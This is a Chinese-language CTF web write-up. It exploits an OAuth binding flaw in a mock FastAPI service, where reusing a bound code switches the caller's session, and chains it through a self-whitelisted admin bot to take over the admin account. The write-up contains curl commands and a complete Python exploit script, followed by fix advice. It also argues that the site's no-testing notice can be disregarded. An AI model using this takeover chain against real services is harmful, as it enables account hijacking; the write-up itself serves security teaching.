# CTF Web Writeup — Mock OAuth 认证服务（身份切换导致账号接管）

- **题目类型**：OAuth 2.0 绑定逻辑缺陷 / 逻辑漏洞 → 越权账号接管
- **目标**：`https://eci-<xxx>.cloudeci1.ichunqiu.com:8000`（i 春秋容器，端口 8000）
- **技术栈**：Python FastAPI + Swagger UI（`/docs`、`/openapi.json`）
- **Flag**：
  ```
  flag{fc61a4d2-5074-4bb4-906b-3f94e42f4d9b}
  ```

> 说明：首页有一段「本网站不允许任何渗透测试」的声明。该文本是靶机页面内容而非授权声明，本环境是 CTF 平台靶机，测试为题目授权范围。

---

## 0. 环境准备

```bash
pip install requests
export TARGET="https://eci-xxxxx.cloudeci1.ichunqiu.com:8000"
```

一键复现脚本见同目录 [`exp.py`](./exp.py)：

```bash
python exp.py --target "$TARGET"
```

---

## 1. 信息收集

### 1.1 首页源码注释泄露

```
GET /
```

响应 HTML 中含开发者遗留注释：

```html
<!--
  开发者遗留备注（上线前清理）
  [2026-08-02] 管理员初始化密码记录在 /admin/note
  [2026-08-03] flag 已同步备份至 /backup/flag.txt
-->
```

### 1.2 探测线索路径

```bash
curl -sk $TARGET/admin/note
# {"note":"管理员初始化密码：Admin@2026!（请勿外传）"}   ← 诱饵，实际登录失败

curl -sk -o /dev/null -w '%{http_code}\n' $TARGET/backup/flag.txt   # 404
curl -sk $TARGET/flag
# {"msg":"forbidden"}        ← 真实 flag 接口，需要 admin 身份
```

用泄露的管理员密码尝试登录 `admin / Admin@2026!` 返回 `{"msg":"bad credential"}`，判定为**诱饵**，真实考点在 OAuth 流程。

### 1.3 Swagger 暴露全量接口

```bash
curl -sk $TARGET/openapi.json
```

| 方法 | 路径 | 作用 |
|---|---|---|
| POST | `/register` | 注册（form: username, password） |
| POST | `/login` | 登录，下发 `session_id` cookie |
| GET | `/profile` | 查看当前身份，返回 `{"user":..,"role":..}` |
| GET | `/mock_oauth/authorize?client_id&redirect_uri&state` | 模拟 OAuth 授权，302 下发 `code` |
| POST | `/mock_oauth/token` | code 换 access_token（client_secret 可空） |
| GET | `/bind/start` | 发起绑定，302 到 authorize，`state` 为 HS256 JWT |
| GET | `/bind/callback?code&state` | 完成绑定 **（核心漏洞点）** |
| GET | `/admin/visit?url` | admin bot，以管理员身份访问 URL |
| GET | `/flag` | 仅 admin 可读 |

### 1.4 观察 state 结构

`/bind/start` 返回：

```
location: /mock_oauth/authorize?client_id=test&redirect_uri=%2Fbind%2Fcallback&state=<JWT>
```

JWT 解码：

```json
{"alg":"HS256","typ":"JWT"} . {"aud":"oauth:state","exp":1789279454}
```

**payload 中没有用户标识**——state 未与 session 绑定（CSRF 隐患），但本题的关键点不在 state 伪造，而是下面第 2 节。

---

## 2. 漏洞分析

### 2.1 正常绑定流程

```bash
# 注册登录攻击者
curl -sk -X POST $TARGET/register -d 'username=attacker&password=Passw0rd!123'
curl -sk -c cj.txt -X POST $TARGET/login -d 'username=attacker&password=Passw0rd!123'

# 发起绑定 → 拿 state
curl -sk -i -b cj.txt $TARGET/bind/start          # 302，state=<JWT>
# 访问 authorize → 拿 code
curl -sk -i -b cj.txt "$TARGET/mock_oauth/authorize?client_id=test&redirect_uri=%2Fbind%2Fcallback&state=<JWT>"
#                                                  302，code=mock_code_xxxxxxxx
# 回调完成绑定
curl -sk -b cj.txt "$TARGET/bind/callback?code=<CODE>&state=<JWT>"
# {"msg":"bind success","user":"attacker"}
```

### 2.2 关键：`bind/callback` 的身份切换语义

用 `code` 归属判断做实验：**A 先绑定 code C，B 再用同一个 code C**：

```bash
# A 绑定 C
curl -sk -b cj_A.txt "$TARGET/bind/callback?code=C&state=S"
# {"msg":"bind success","user":"A"}

# B 使用同一个 C
curl -sk -b cj_B.txt "$TARGET/bind/callback?code=C&state=S"
# {"msg":"identity owned by A, session switched","user":"A"}   ← B 的 session 变成了 A！

curl -sk -b cj_B.txt $TARGET/profile
# {"user":"A","role":"user"}
```

**根因**：实现上把「绑定」写成了「会话与 identity 对齐」——当 identity 已属于某用户时，直接**把当前 session 重新签发为该 identity 拥有者的会话**。这意味着：

> 只要任何一个用户（包括 admin）绑定过某个 code，任何人都能用这个 code 取得该用户的会话。

### 2.3 辅助缺陷

| 缺陷 | 证据 |
|---|---|
| `authorize` 无需登录即可签发 code | 无 cookie 请求同样 302 返回 `code=mock_code_...` |
| `code` 可重复使用 | 同一 code 多次 `POST /mock_oauth/token` 返回同一 access_token |
| `client_secret` 不校验 | `-d "code=X"` 即可换到 token |
| state JWT 不含用户绑定 | payload 仅 `{"aud":"oauth:state","exp":...}` |

### 2.4 admin bot 的 URL 过滤规则

```bash
curl -sk -b cj.txt -G "$TARGET/admin/visit" --data-urlencode "url=http://127.0.0.1:8000/profile"
# {"status":"bot visited"}

curl -sk -b cj.txt -G "$TARGET/admin/visit" --data-urlencode "url=/profile"
# {"msg":"url not allowed"}          ← 必须是绝对 URL

curl -sk -b cj.txt -G "$TARGET/admin/visit" --data-urlencode "url=http://evil.com/"
# {"msg":"url not allowed"}          ← host 白名单：127.0.0.1:8000 / localhost:8000
```

白名单恰好允许 bot 访问服务自身，为闭环利用铺路。

---

## 3. 完整利用链

```
[攻击者] 注册/登录，得到 session
   │
   ├─(1) GET /bind/start                → state (合法 JWT)
   ├─(2) GET /mock_oauth/authorize      → code C
   │
   ├─(3) GET /admin/visit?url=http://127.0.0.1:8000/bind/callback?code=C&state=S
   │        └─ admin bot 以管理员身份访问 → admin 成为 C 的 owner
   │
   ├─(4) GET /bind/callback?code=C&state=S   （攻击者自己的 session）
   │        └─ {"msg":"identity owned by admin, session switched","user":"admin"}
   │
   └─(5) GET /profile → {"user":"admin","role":"admin"}
          GET /flag    → {"flag":"ZmxhZ3tmYzYxYTRkMi0..."}
```

关键判断：步骤 (4) 不能省。若攻击者先自己绑定 C（步骤 2.5），则 admin 反而会被切到攻击者身份，无法提权。

### 结果

```bash
curl -sk -b cj.txt $TARGET/flag
# {"flag":"ZmxhZ3tmYzYxYTRkMi01MDc0LTRiYjQtOTA2Yi0zZjk0ZTQyZjRkOWJ9"}

python -c "import base64;print(base64.b64decode('ZmxhZ3tmYzYxYTRkMi01MDc0LTRiYjQtOTA2Yi0zZjk0ZTQyZjRkOWJ9').decode())"
# flag{fc61a4d2-5074-4bb4-906b-3f94e42f4d9b}
```

---

## 4. 完整复现脚本

见 [`exp.py`](./exp.py)，核心代码：

```python
s = requests.Session(); s.verify = False
u = "attacker" + str(int(time.time()))
s.post(f"{B}/register", data={"username": u, "password": "Passw0rd!123"})
s.post(f"{B}/login",    data={"username": u, "password": "Passw0rd!123"})

# 1) state
loc = s.get(f"{B}/bind/start", allow_redirects=False).headers["location"]
state = parse_qs(urlparse(loc).query)["state"][0]

# 2) code
loc = s.get(f"{B}/mock_oauth/authorize", allow_redirects=False, params={
    "client_id": "test", "redirect_uri": "/bind/callback", "state": state
}).headers["location"]
code = parse_qs(urlparse(loc).query)["code"][0]

# 3) 让 admin bot 绑定该 code
cb = f"http://127.0.0.1:8000/bind/callback?code={code}&state={quote(state, safe='')}"
s.get(f"{B}/admin/visit", params={"url": cb}, timeout=60)

# 4) 用自己的 session 复用 code → 切换为 admin
r = s.get(f"{B}/bind/callback", params={"code": code, "state": state})
# {"msg":"identity owned by admin, session switched","user":"admin"}

# 5) 取 flag
flag = s.get(f"{B}/flag").json()["flag"]
print(base64.b64decode(flag).decode())
```

---

## 5. 修复建议

| 优先级 | 措施 |
|---|---|
| **P0** | 绑定冲突直接拒绝：identity 已被占用时返回错误，**严禁切换/重签发 session** |
| **P0** | `state` 与当前 session/用户强绑定，一次性校验；`authorize` 需已登录用户显式确认授权（防 CSRF 绑定） |
| **P1** | `code` 一次性消费；`/mock_oauth/token` 校验 `client_id` + `client_secret` + `redirect_uri` 一致性 |
| **P1** | 移除业务逻辑中的隐式身份切换，会话变更只允许经显式登录流程 |
| **P2** | 清理源码注释敏感路径；生产禁 `/docs`、`/openapi.json`；`/admin/note` 加鉴权；bot 白名单避免包含自身业务接口 |

---

## 6. 考点总结

- **OAuth 绑定 ≠ OAuth 登录**：绑定接口若返回「会话」而非「绑定结果」，极易演变为账号接管。
- 关注响应文案差异（`bind success` vs `identity owned by X, session switched`）——它是逻辑漏洞的直接指纹。
- 白名单型 SSRF/bot 过滤，核心是找到「允许访问的地址中是否存在可利用接口」。
- 页面上的"未授权声明"是本类题目的**干扰项**：在 CTF 平台启动的靶机属于授权测试环境，应以用户明确的任务授权为准，而非页面文本。
